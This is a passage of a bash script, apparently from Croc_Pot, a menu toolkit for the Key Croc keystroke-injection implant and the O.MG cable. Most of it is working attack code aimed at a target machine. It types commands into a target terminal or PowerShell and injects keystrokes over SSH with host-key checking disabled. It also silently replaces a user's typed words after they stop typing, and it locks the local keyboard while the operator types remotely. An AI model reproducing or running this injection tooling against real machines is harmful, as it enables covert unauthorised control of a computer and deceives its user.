			user_input_passwd "$omg_v" O.MG_WIFI
			CONNECT_OMG ;;
		*)
			invalid_entry ;;
		esac
	else
		ColorRed 'DID NOT FOUND ANY EXISTING O.MG WIFI CREDENTIALS\n'
		read_all 'CONNECT KEYCROC TO O.MG CABLE WIFI ACCESS POINT Y/N AND PRESS [ENTER]'
		case "$r_a" in
		[yY] | [yY][eE][sS])
			ColorYellow 'Checking for O.MG wifi access point \n'
			iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
			read_all 'ENTER O.MG SSID AND PRESS [ENTER]' ; echo "$r_a" >> "$omg_v"
			user_input_passwd "$omg_v" O.MG_WIFI
			CONNECT_OMG ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
		esac
	fi ;;
[nN] | [nN][oO])
	ColorYellow 'Maybe next time\n' ;;
*)
	invalid_entry ;;
esac
}
##
#----O.MG start O.MG web UI
##
omg_web() {
	Info_Screen '-Open target web browser and start O.MG web UI
-Ensure target is connected to O.MG wifi access point first'
	read_all 'START O.MG WEB UI Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			start_web http://192.168.4.1 ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----O.MG wifi access point payload
##
omg_quick_connect() {
	Info_Screen '-Create payload to connect Quickly to O.MG wifi access point
Select # 3 WIFI SETUP PAYLOAD to create payload'
	read_all 'CREATE PAYLOAD FOR O.MG QUICK CONNECT AP Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			install_payloads_menu ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----O.MG check local network for O.MG cable
##
omg_check() {
	Info_Screen '-Check local network for O.MG cable
-Ensure O.MG is connected to same local network as Keycroc'
##
#----Ping entire network Check local network for O.MG cable
##
	read_all 'SCAN FOR O.MG CABLE Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			local t_ip=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " " | sed -r 's/.{1}$//')
			for omg in {1..254} ;do (ping -q -c 1 -w 1 "$t_ip""$omg" >/dev/null && echo "$t_ip$omg" &) ;done
			arp -a | sed -n 's/\(O.lan\)/\1/p'
			local omg_ip=$(arp -a | sed -n 's/\(O.lan\)/\1/p' | awk '{print $2}' | sed 's/[(),]//g')
			if [[ "${omg_ip}" =~ $validate_ip ]]; then
				ping -q -c 1 -w 1 "$omg_ip" &>/dev/null 2>&1
				if [[ $? -ne 0 ]]; then
					ColorRed 'No O.MG cable detected\n'
				elif [[ "${#args[@]}" -eq 0 ]]; then
					ColorYellow "O.MG cable IP: $(ColorGreen "$omg_ip")\n"
					read_all 'START O.MG WEB UI Y/N AND PRESS [ENTER]'
					case "$r_a" in
						[yY] | [yY][eE][sS])
							start_web http://"$omg_ip" ;;
						[nN] | [nN][oO])
							ColorYellow 'Maybe next time\n' ;;
						*)
							invalid_entry ;;
					esac
				fi
			else
				ColorRed 'No O.MG cable detected\n'
			fi ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----O.MG cable Menu
##
	MenuTitle 'O.MG CABLE MENU'
	MenuColor 21 1 'KEYCROC TO O.MG WIFI'
	MenuColor 21 2 'START O.MG WEB UI'
	MenuColor 21 3 'O.MG GITHUB PAGE'
	MenuColor 21 4 'O.MG AP PAYLOAD'
	MenuColor 21 5 'O.MG LOCAL NETWORK'
	MenuColor 21 6 'O.MG WEB FLASHER'
	MenuColor 21 7 'RETURN TO MAIN MENU'
	MenuEnd 20
	case "$m_a" in
		1) omg_wifi ; omg_cable ;;
		2) omg_web ; omg_cable ;;
		3) start_web https://github.com/O-MG ; omg_cable ;;
		4) omg_quick_connect ; omg_cable ;;
		5) omg_check ; omg_cable ;;
		6) start_web https://o-mg.github.io/WebFlasher ; omg_cable ;;
		7) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; omg_cable ;;
		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; omg_cable ;;
	esac
}
##
#----QUACK Explore, Exploring different ways to insert quack command
##
insert_quack() {
	Info_Screen '-Exploring different ways to run quack command
-More for having remote access to keycroc and Run Croc_Pot remotely
-Send QUACK command and start payloads remotely'
##
#----open Target terminal Insert Quack command
##
q_terminal() {
	Info_Screen '-This will open Target terminal
-run one Quack command and exit
-Example: type hello world
-hello world should display in terminal and exit'
	read_all 'QUACK COMMAND TARGET TERMINAL Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			if [ "$(OS_CHECK)" = WINDOWS ]; then
				read_all 'ENTER WORD TO QUACK AND PRESS [ENTER]'
				QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell" ; QUACK ENTER ; sleep 2 ; QUACK STRING "${r_a}" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB
			else
				case "$HOST_CHECK" in
					raspberrypi)
						read_all 'ENTER WORD TO QUACK AND PRESS [ENTER]'
						QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "${r_a}" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
					"$HOST_CHECK")
						read_all 'ENTER WORD TO QUACK AND PRESS [ENTER]'
						QUACK ALT-t ; QUACK ENTER ; sleep 1 ; QUACK STRING "${r_a}" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
					*)
						read_all 'ENTER WORD TO QUACK AND PRESS [ENTER]'
						QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "${r_a}" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
				esac
			fi ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Insert Quack command into the SSH command before sending
##
q_ssh() {
	Info_Screen '-QUACK command into the SSH command before sending
-Need to know target: HOST_NAME, IP, PASSWD
-This will QUACK one command and exit,'
	read_all 'SEND QUACK COMMAND OVER SSH Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			read_all 'ENTER TARGET IP AND PRESS [ENTER]' ; local T_IP="$r_a"
			if [[ "$T_IP" =~ $validate_ip ]]; then
				ping -q -c 1 -w 1 "$T_IP" &>/dev/null 2>&1
				if [[ $? -ne 0 ]]; then
					ColorRed 'Unable to reach host\n'
				elif [[ "${#args[@]}" -eq 0 ]]; then
					read_all 'ENTER HOST_NAME AND PRESS [ENTER]' ; local T_H="$r_a"
					if [ -f /tmp/Q_C.txt ]; then
						local T_W=$(sed -n 1p /tmp/Q_C.txt)
					else
						user_input_passwd /tmp/Q_C.txt TARGET
						local T_W=$(sed -n 1p /tmp/Q_C.txt)
					fi
					ColorYellow 'Example: enter uptime\n'
					read_all 'ENTER QUACK COMMAND AND PRESS [ENTER]'
					sshpass -p "$T_W" ssh -o "StrictHostKeyChecking no" "$T_H"@"$T_IP" "$(QUACK STRING "${r_a}" ; QUACK ENTER ; QUACK STRING "exit" ; QUACK ENTER)"
				fi
			else
				ColorRed 'Not a valid ip address\n' ; invalid_entry
			fi ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Quack command to target
##
q_target() {
	Info_Screen '-QUACK command to target
-This with QUACK two command at target current running application
-This will run in loop, PRESS CONTROL + C TO EXIT
-Example: STRING hak5   <-- First QUACK command
          ENTER         <-- Second QUACK command'
	read_all 'START QUACK COMMAND TARGET Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			reset_broken
			while [ "$broken" -eq 1 ] && break || : ; do
				read_all 'ENTER FIRST QUACK COMMAND AND PRESS [ENTER]' ; local Q_C_A="$r_a"
				read_all' ENTER SECOND QUACK COMMAND AND PRESS [ENTER]' ; local Q_C_B="$r_a"
				QUACK "$Q_C_A" ; sleep 1 ; QUACK "$Q_C_B"
			done ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Start payload at remote location enter payload name
##
remote_payload() {
	Info_Screen '-Start payloads from remote location
-Enter full path of payload name
-PRESS CONTROL + C TO STOP PAYLOAD'
	read_all 'START PAYLOAD Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			f=`find /root/udisk/payloads -type f -name "*"` ; ColorGreen "$f\n"
			read_all 'ENTER FULL PATH OF PAYLOAD AND PRESS [ENTER]'
			"$r_a" ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Quack Explore replace target characters with input
##
remote_replace() {
	Info_Screen '-Remotely replace user characters
-This will wait for keyboard activity then wait for inactivity
and then delete and replace user characters
-Enter in characters to be replace
-PRESS CTRL + C to break loop in terminal'
	read_all 'START REMOTE REPLACE Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			reset_broken
			while [ "$broken" -eq 1 ] && break || : ; do
				(( i++ ))
				read_all 'ENTER CHARACTERS TO REPLACE AND PRESS [ENTER]'
				ColorYellow "WAITING FOR KEYBOARD$(ColorCyan ' ACTIVITY ')$(ColorYellow 'COUNT: ')$(ColorGreen "$i")\n\n"
				WAIT_FOR_KEYBOARD_ACTIVITY 0
				ColorYellow "KEYBOARD IN USE WAITING FOR $(ColorCyan 'INACTIVITY')\n\n"
				WAIT_FOR_KEYBOARD_INACTIVITY 1
				ColorYellow "REPLACING USER CHARACTERS WITH: $(ColorGreen "$r_a")\n"
				QUACK CONTROL-SHIFT-LEFTARROW
				QUACK BACKSPACE
				QUACK STRING "${r_a}"
			done ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----View Local Keyboard active or inactive
##
kb_activity() {
	Info_Screen '-Indicate if target Local Keyboard is active or inactive
-PRESS CTRL + C to break loop in terminal'
	reset_broken
	while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
		local temp=${spinstr#?}
		echo -ne "\e[40;3$(( RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")$clear${yellow}LOCAL KEYBOARD: $clear${green}ACTIVE $clear${yellow}COUNT: $clear$green$((i++))$clear\033[0K\r"
		local spinstr=$temp${spinstr%"$temp"}
	done &
	while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_INACTIVITY 1; do
		local temp=${spinstr#?}
		echo -ne "\e[40;3$(( RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")$clear${yellow}LOCAL KEYBOARD: $clear${cyan}INACTIVE $clear${yellow}COUNT: $clear$green$((i++))$clear\033[0K\r"
		local spinstr=$temp${spinstr%"$temp"}
	done
}
##
#----Keycroc Remote keyboard Enter keystroke entry from remote device
##
remote_keyboard() {
	Info_Screen '-Keycroc Remote keyboard, Enter keystroke entry from remote device

-Start remote ssh session with keycroc then run Croc_Pot with typing
/root/udisk/tools/Croc_Pot.sh select this option and start typing in
remote terminal keystroke entry should display on target

NOTE: Not all keystroke entry are working at the moment
**Local keyboard will be lockout**

-Alternet keystrokes entry

-Press ALT-i will execute QUACK GUI i
-Press ALT-x will execute QUACK GUI x
-Press ALT-0 will execute QUACK GUI
-Press ALT-4 will execute QUACK ALT-F4
-Press ALT-5 will execute QUACK GUI r
-Press ALT-6 will execute QUACK GUI d
-Press ALT-7 will execute QUACK GUI l
-Press ALT-8 will execute QUACK CONTROL-ALT-d
-Press ALT-9 will execute QUACK CONTROL-ALT-t
-Press ALT-z will execute QUACK CONTROL-z
-Press ALT-c will execute QUACK ALT-SPACE ; Q c
-Press ALT-s will execute QUACK ALT-SPACE
-Press ALT-n will execute QUACK NUMLOCK
-Press ALT-l will execute QUACK CAPSLOCK
-Press ALT-p will execute QUACK PRINTSCREEN
-Press ALT-u will execute QUACK UNLOCK (local keyboard)
-Press ALT-o will execute QUACK LOCK (local keyboard)
-Press ALT-SHIFT-T will execute QUACK ALT-TAB
-Press ALT-SHIFT-E will execute QUACK ALT-ESCAPE
-Press CTRL-t will execute QUACK CONTROL-TAB
-Press F2 to return back to menu'
	read_all 'START REMOTE KEYBOARD Y/N AND PRESS [ENTER]'
case "$r_a" in
	[yY] | [yY][eE][sS])
		ColorYellow "\n\n\tKEYCROC REMOTE KEYBOARD ENTER KEYSTROKES HERE\n\n"
		QUACK LOCK
		trap ctrl_c SIGINT
		stty -echo
		declare -a fnkey
		for x in {1..12}; do
			raw="$(tput kf"$x" | cat -A)"
			fnkey["$x"]="${raw#^[}"
		done
		read_key_press() {
			if IFS= read -r -n 1 key_press; then
				while read -N 1 -t 0.001; do
					key_press+="$REPLY"
				done
				printf -v key_code "%d" "'$key_press"
			fi
		}
	while read_key_press; do
		ctrl_c() {
			QUACK CONTROL-c ; echo -ne " CTRL-C "
		}
		case "$key_press" in
			$'\e'"${fnkey[1]}") QUACK F1 ; echo -ne " F1 " ;;
			$'\e'"${fnkey[2]}") QUACK F2 ; echo -ne " F2 \n\nYou have exited returned to the main menu" ; QUACK UNLOCK ; trap - SIGINT ; stty echo ; break ;;
			$'\e'"${fnkey[3]}") QUACK F3 ; echo -ne " F3 " ;;
			$'\e'"${fnkey[4]}") QUACK F4 ; echo -ne " F4 " ;;
			$'\e'"${fnkey[5]}") QUACK F5 ; echo -ne " F5 " ;;
			$'\e'"${fnkey[6]}") QUACK F6 ; echo -ne " F6 " ;;
			$'\e'"${fnkey[7]}") QUACK F7 ; echo -ne " F7 " ;;
			$'\e'"${fnkey[8]}") QUACK F8 ; echo -ne " F8 " ;;
			$'\e'"${fnkey[9]}") QUACK F9 ; echo -ne " F9 " ;;
			$'\e'"${fnkey[10]}") QUACK F10 ; echo -ne " F10 " ;;
			$'\e'"${fnkey[11]}") QUACK F11 ; echo -ne " F11 " ;;
			$'\e'"${fnkey[12]}") QUACK F12 ; echo -ne " F12 " ;;
			$'\E[1;2P') QUACK SHIFT-F1 ; echo -ne " SHIFT-F1 " ;;
			$'\E[1;2Q') QUACK SHIFT-F2 ; echo -ne " SHIFT-F2 " ;;
			$'\E[1;2R') QUACK SHIFT-F3 ; echo -ne " SHIFT-F3 " ;;
			$'\E[1;2S') QUACK SHIFT-F4 ; echo -ne " SHIFT-F4 " ;;
			$'\E[15;2~') QUACK SHIFT-F5 ; echo -ne " SHIFT-F5 " ;;
			$'\E[17;2~') QUACK SHIFT-F6 ; echo -ne " SHIFT-F6 " ;;
			$'\E[18;2~') QUACK SHIFT-F7 ; echo -ne " SHIFT-F7 " ;;
			$'\E[19;2~') QUACK SHIFT-F8 ; echo -ne " SHIFT-F8 " ;;
			$'\E[20;2~') QUACK SHIFT-F9 ; echo -ne " SHIFT-F9 " ;;
			$'\E[21;2~') QUACK SHIFT-F10 ; echo -ne " SHIFT-F10 " ;;
			$'\E[23;2~') QUACK SHIFT-F11 ; echo -ne " SHIFT-F11 " ;;
			$'\E[24;2~') QUACK SHIFT-F12 ; echo -ne " SHIFT-F12 " ;;
			$'\e[Z') QUACK SHIFT-TAB ; echo -ne " SHIFT-TAB " ;;
			$'\el') QUACK CAPSLOCK ; echo -ne " CAPSLOCK " ;;
			$'\es') QUACK ALT-SPACE ; echo -ne " ALT-SPACE " ;;
			$'\en') QUACK NUMLOCK ; echo -ne " NUMLOCK " ;;
			$'\ep') QUACK PRINTSCREEN ; echo -ne " PRINTSCREEN " ;;
			$'\e[5~') QUACK KEYCODE 00,00,4b ; echo -ne " PAGEUP " ;;
			$'\e[6~') QUACK PAGEDOWN ; echo -ne " PAGEDOWN " ;;
			$'\e[2~') QUACK INSERT ; echo -ne " INSERT " ;;
			$'\e[3~') QUACK DELETE ; echo -ne " DELETE " ;;
			$'\t') QUACK TAB ; echo -ne " TAB " ;;
			$'\e[F') QUACK END ; echo -ne " END " ;;
			$'\e[H') QUACK HOME ; echo -ne " HOME " ;;
			$'\033') QUACK ESCAPE ; echo -ne " ESC " ;;
			$'\E[A') QUACK UPARROW ; echo -ne " UPARROW " ;;
			$'\E[B') QUACK DOWNARROW ; echo -ne " DOWNARROW " ;;
			$'\E[D') QUACK LEFTARROW ; echo -ne " LEFTARROW " ;;
			$'\E[C') QUACK RIGHTARROW ; echo -ne " RIGHTARROW " ;;
			$'\e8') QUACK CONTROL-ALT-d ; echo -ne " CTRL-ALT-D " ;;
			$'\e9') QUACK CONTROL-ALT-t ; echo -ne " CTRL-ALT-T " ;;
			$'\ez') QUACK CONTROL-z ; echo -ne " CTRL-Z " ;;
			$'\177') QUACK BACKSPACE ; echo -ne "\b \b" ;;
			$'\x20') QUACK KEYCODE 00,00,2c ; echo -ne " " ;;
			$'\ex') QUACK GUI x ; echo -ne " GUI-X " ;;
			$'\e5') QUACK GUI r ; echo -ne " GUI-R " ;;
			$'\e6') QUACK GUI d ; echo -ne " GUI-D " ;;
			$'\e7') QUACK GUI l ; echo -ne " GUI-L " ;;
			$'\ei') QUACK GUI i ; echo -ne " GUI-I " ;;
			$'\e0') QUACK GUI ; echo -ne " GUI " ;;
			$'\e1') QUACK ALT-1 ; echo -ne " ALT-1 " ;;
			$'\e2') QUACK ALT-2 ; echo -ne " ALT-2 " ;;
			$'\e3') QUACK ALT-3 ; echo -ne " ALT-3 " ;;
			$'\e4') QUACK ALT-F4 ; echo -ne " ALT-F4 " ;;
			$'\e.') QUACK ALT-. ; echo -ne " ALT-. " ;;
			$'\ea') QUACK ALT-a ; echo -ne " ALT-A " ;;
			$'\eb') QUACK ALT-b ; echo -ne " ALT-B " ;;
			$'\ec') QUACK ALT-SPACE ; Q c ; echo -ne " ALT-SPACE-C " ;;
			$'\ed') QUACK ALT-d ; echo -ne " ALT-D " ;;
			$'\ee') QUACK ALT-e ; echo -ne " ALT-E " ;;
			$'\ef') QUACK ALT-f ; echo -ne " ALT-F " ;;
			$'\eg') QUACK ALT-g ; echo -ne " ALT-G " ;;
			$'\eh') QUACK ALT-h ; echo -ne " ALT-H " ;;
			$'\ej') QUACK ALT-j ; echo -ne " ALT-J " ;;
			$'\ek') QUACK ALT-k ; echo -ne " ALT-K " ;;
			$'\eu') QUACK UNLOCK ; echo -ne " Unlocking Local keyboard " ;;
			$'\eo') QUACK LOCK ; echo -ne " Locking Local keyboard " ;;
			$'\et') QUACK ALT-t ; echo -ne " ALT-t " ;;
			$'\ev') QUACK ALT-v ; echo -ne " ALT-V " ;;
			$'\ey') QUACK ALT-y ; echo -ne " ALT-Y " ;;
			$'\eA') QUACK ALT-SHIFT-a ; echo -ne " ALT-SHIFT-A " ;;
			$'\eB') QUACK ALT-SHIFT-b ; echo -ne " ALT-SHIFT-B " ;;
			$'\eC') QUACK ALT-SHIFT-c ; echo -ne " ALT-SHIFT-C " ;;
			$'\eD') QUACK ALT-SHIFT-d ; echo -ne " ALT-SHIFT-D " ;;
			$'\eE') QUACK ALT-ESCAPE ; echo -ne " ALT-ESC " ;;
			$'\eF') QUACK ALT-SHIFT-f ; echo -ne " ALT-SHIFT-F " ;;
			$'\eP') QUACK ALT-SHIFT-p ; echo -ne " ALT-SHIFT-P " ;;
			$'\eW') QUACK ALT-SHIFT-w ; echo -ne " ALT-SHIFT-W " ;;
			$'\eL') QUACK ALT-SHIFT-l ; echo -ne " ALT-SHIFT-L " ;;
			$'\eT') QUACK ALT-TAB ; echo -ne " ALT-TAB " ;;
			$'\e[1;3P') QUACK ALT-F1 ; echo -ne " ALT-F1 " ;;
			$'\e[1;3Q') QUACK ALT-F2 ; echo -ne " ALT-F2 " ;;
			$'\e[1;3R') QUACK ALT-F3 ; echo -ne " ALT-F3 " ;;
			$'\e[1;3S') QUACK ALT-F4 ; echo -ne " ALT-F4 " ;;
			$'\e[15;3~') QUACK ALT-F5 ; echo -ne " ALT-F5 " ;;
			$'\e[17;3~') QUACK ALT-F6 ; echo -ne " ALT-F6 " ;;
			$'\e[18;3~') QUACK ALT-F7 ; echo -ne " ALT-F7 " ;;
			$'\e[19;3~') QUACK ALT-F8 ; echo -ne " ALT-F8 " ;;
			$'\e[20;3~') QUACK ALT-F9 ; echo -ne " ALT-F9 " ;;
			$'\e[21;3~') QUACK ALT-F10 ; echo -ne " ALT-F10 " ;;
			$'\e[23;3~') QUACK ALT-F11 ; echo -ne " ALT-F11 " ;;
			$'\e[24;3~') QUACK ALT-F12 ; echo -ne " ALT-F12 " ;;
			$'\e[1;3A') QUACK ALT-UPARROW ; echo -ne " ALT-UPARROW " ;;
			$'\e[1;3B') QUACK ALT-DOWNARROW ; echo -ne " ALT-DOWNARROW " ;;
			$'\e[1;3C') QUACK ALT-RIGHTARROW ; echo -ne " ALT-RIGHTARROW " ;;
			$'\e[1;3D') QUACK ALT-LEFTARROW ; echo -ne " ALT-LEFTARROW " ;;
			$'\e[1;6A') QUACK CONTROL-SHIFT-UPARROW ; echo -ne " CTRL-SHIFT-UPARROW " ;;
			$'\e[1;6B') QUACK CONTROL-SHIFT-DOWNARROW ; echo -ne " CTRL-SHIFT-DOWNARROW " ;;
			$'\e[1;6C') QUACK CONTROL-SHIFT-RIGHTARROW ; echo -ne " CTRL-SHIFT-RIGHTARROW " ;;
			$'\e[1;6D') QUACK CONTROL-SHIFT-LEFTARROW ; echo -ne " CTRL-SHIFT-LEFTARROW " ;;
			$'\e[1;5A') QUACK CONTROL-UPARROW ; echo -ne " CTRL-UPARROW " ;;
			$'\e[1;5B') QUACK CONTROL-DOWNARROW ; echo -ne " CTRL-DOWNARROW " ;;
			$'\e[1;5C') QUACK CONTROL-RIGHTARROW ; echo -ne " CTRL-RIGHTARROW " ;;
			$'\e[1;5D') QUACK CONTROL-LEFTARROW ; echo -ne " CTRL-LEFTARROW " ;;
			$'\e[1;2A') QUACK SHIFT-UPARROW ; echo -ne " SHIFT-UPARROW " ;;
			$'\e[1;2B') QUACK SHIFT-DOWNARROW ; echo -ne " SHIFT-DOWNARROW " ;;
			$'\e[1;2C') QUACK SHIFT-RIGHTARROW ; echo -ne " SHIFT-RIGHTARROW " ;;
			$'\e[1;2D') QUACK SHIFT-LEFTARROW ; echo -ne " SHIFT-LEFTARROW " ;;
			$'\0') QUACK ENTER ; echo -ne " ENTER \n" ;;
			[[:graph:]]) QUACK STRING "$key_press" ; echo -ne "$key_press" ;;
			*)
			case "$key_code" in
				1) QUACK CONTROL-a ; echo -ne " CTRL-A " ;;
				2) QUACK CONTROL-b ; echo -ne " CTRL-B " ;;
				4) QUACK CONTROL-d ; echo -ne " CTRL-D " ;;
				5) QUACK CONTROL-e ; echo -ne " CTRL-E " ;;
				6) QUACK CONTROL-f ; echo -ne " CTRL-F " ;;
				7) QUACK CONTROL-g ; echo -ne " CTRL-G " ;;
				8) QUACK CONTROL-h ; echo -ne " CTRL-H " ;;
				10) QUACK CONTROL-j ; echo -ne " CTRL-J " ;;
				11) QUACK CONTROL-k ; echo -ne " CTRL-K " ;;
				12) QUACK CONTROL-l ; echo -ne " CTRL-L " ;;
				13) QUACK CONTROL-m ; echo -ne " CTRL-M " ;;
				14) QUACK CONTROL-n ; echo -ne " CTRL-N " ;;
				15) QUACK CONTROL-o ; echo -ne " CTRL-O " ;;
				16) QUACK CONTROL-p ; echo -ne " CTRL-P " ;;
				17) QUACK CONTROL-q ; echo -ne " CTRL-Q " ;;
				18) QUACK CONTROL-r ; echo -ne " CTRL-R " ;;
				19) QUACK CONTROL-s ; echo -ne " CTRL-S " ;;
				20) QUACK CONTROL-TAB ; echo -ne " CTRL-TAB " ;;
				21) QUACK CONTROL-u ; echo -ne " CTRL-U " ;;
				22) QUACK CONTROL-v ; echo -ne " CTRL-V " ;;
				23) QUACK CONTROL-w ; echo -ne " CTRL-W " ;;
				24) QUACK CONTROL-x ; echo -ne " CTRL-X " ;;
				25) QUACK CONTROL-y ; echo -ne " CTRL-Y " ;;
			esac
			;;
		esac
	done ;;
	[nN] | [nN][oO])
		ColorYellow 'Maybe next time\n' ;;
	*)
		invalid_entry ;;
esac
}
##
#----Quack Explore command Menu
##
	MenuTitle 'QUACK EXPLORE MENU'
	MenuColor 21 1 'QUACK TARGET TERMINAL'
	MenuColor 21 2 'QUACK OVER SSH'
	MenuColor 21 3 'QUACK TARGET'
	MenuColor 21 4 'PAYLOAD STARTER'
	MenuColor 21 5 'REMOTE REPLACE'
	MenuColor 21 6 'KEYBOARD ACTIVITY'
	MenuColor 21 7 'REMOTE KEYBOARD'
	MenuColor 21 8 'RETURN TO MAIN MENU'
	MenuEnd 20
	case "$m_a" in
		1) q_terminal ; insert_quack ;;
		2) q_ssh ; insert_quack ;;
		3) q_target ; insert_quack ;;
		4) remote_payload ; insert_quack ;;
		5) remote_replace ; insert_quack ;;
		6) kb_activity ; insert_quack ;;
		7) remote_keyboard ; insert_quack ;;
		8) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; insert_quack ;;
		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; insert_quack ;;
	esac
}
##
#----https://chat.openai.com/
##
chat_openai() {
	install_package jq JQ
	Info_Screen '-Run ChatGPT on keycroc https://chat.openai.com
-This code was created by ChatGPT

This is a simple shell script that creates a chatbot using the OpenAI GPT-3 API.
Script starts by printing a greeting message
ChatGPT: Hello! How can I help you today?
and then enters into a loop that waits for user input.
When the user inputs a message, the script creates a prompt by prefixing
the user input with "ChatGPT:".
The prompt is then used as the input for the OpenAI API request.
API request is made using curl and the response is captured in a shell variable.
The response from the API is then processed with jq,
a command line tool for processing JSON, to extract the text generated by GPT-3.
This text is then printed as the chatbot response.
The loop continues to wait for user input until the user types bye,
at which point the script breaks out of the loop and prints
ChatGPT: Bye! Have a great day!

-Requirements: jq and your ChatGPT API keys'
	read_all 'START ChatGPT Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			validate_api_key() {
				api_key=$(sed -n 1p /root/udisk/tools/Croc_Pot/ChatGPT_API.txt)
				if [ -z "$api_key" ]; then
					ColorRed "Error: API key is not set.\n"
					rm /root/udisk/tools/Croc_Pot/ChatGPT_API.txt
					user_input_passwd /root/udisk/tools/Croc_Pot/ChatGPT_API.txt API_KEYS
					api_key=$(sed -n 1p /root/udisk/tools/Croc_Pot/ChatGPT_API.txt)
				fi
			} 2>/dev/null
			validate_api_key
			temperature=0.5
			max_tokens=1024
			ColorYellow "ChatGPT: $(ColorCyan "Hello! How can I help you today ?")\n"
			while true; do
				ColorYellow "You: " ; IFS= read -r user_input
				case "$user_input" in
					"bye")
						ColorYellow "ChatGPT: $(ColorCyan "Bye! Have a great day!")"
						break ;;
					"temperature"*)
						temperature=$(echo $user_input | awk '{print $2}')
						ColorYellow "ChatGPT: $(ColorCyan "Temperature set to $temperature.")\n"
						continue ;;
					"max tokens"*)
						max_tokens=$(echo $user_input | awk '{print $3}')
						ColorYellow "ChatGPT: $(ColorCyan "Maximum number of tokens set to $max_tokens.")\n"
						continue ;;
					*)
						prompt="ChatGPT: $user_input" ;;
				esac
				response=$(curl -s -X POST https://api.openai.com/v1/engines/text-davinci-003/completions \
				-H "Content-Type: application/json" \
				-H "Authorization: Bearer $api_key" \
				-d "{
				\"prompt\": \"$prompt\",
				\"max_tokens\": $max_tokens,
				\"n\": 1,
				\"temperature\": $temperature
				}")
				if [ $? -ne 0 ]; then
					ColorRed "Error: Request failed\n"
					continue
				fi
				if [ "$response" = "null" ] || [ -z "$response" ]; then
					ColorRed "Error: API response is invalid.\n"
					continue
				fi
				answer=$(echo $response | jq -r '.choices[0].text')
				if [ "$answer" = "null" ] || [ -z "$answer" ]; then
					ColorRed "Error: API response does not contain a valid answer.\n"
					continue
				fi
				ColorYellow "ChatGPT: $(ColorCyan "$answer")\n"
			done ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Croc Pot Plus Menu
##
	croc_title && tput cup 6 0
	MenuTitle 'CROC POT PLUS MENU'
	MenuColor 20 1 'RECON SCAN MENU'
	MenuColor 20 2 'CROC VPN SETUP'
	MenuColor 20 3 'PASS TIME GAMES'
	MenuColor 20 4 'INSTALL PAYLOADS'
	MenuColor 20 5 'O.MG CABLE MENU'
	MenuColor 20 6 'QUACK EXPLORE'
	MenuColor 20 7 'CHAT GPT'
	MenuColor 20 8 'RETURN TO MAIN MENU'
	MenuEnd 19
	case "$m_a" in
		1) croc_recon ;;
		2) croc_vpn ;;
		3) pass_time ;;
		4) install_payloads_menu ;;
		5) omg_cable ;;
		6) insert_quack ;;
		7) chat_openai ; croc_pot_plus ;;
		8) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; croc_pot_plus ;;
		[pP]) Panic_button ;;
		kp | KP) start_icmp ; croc_pot_plus ;;
		st | ST) reset_broken ; croc_pot_plus ;;
		[bB]) main_menu ;;
		*) invalid_entry ; croc_pot_plus ;;
	esac
}
##
#----Croc status menu/functions
##
function croc_status() {
	local LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
##
#----status Install screenfetch 
##
	install_package screenfetch SCREENFETCH
##
#----status Display screenfetch 
##
	echo -ne "\n\e[48;5;202;30m$LINE$clear\n"
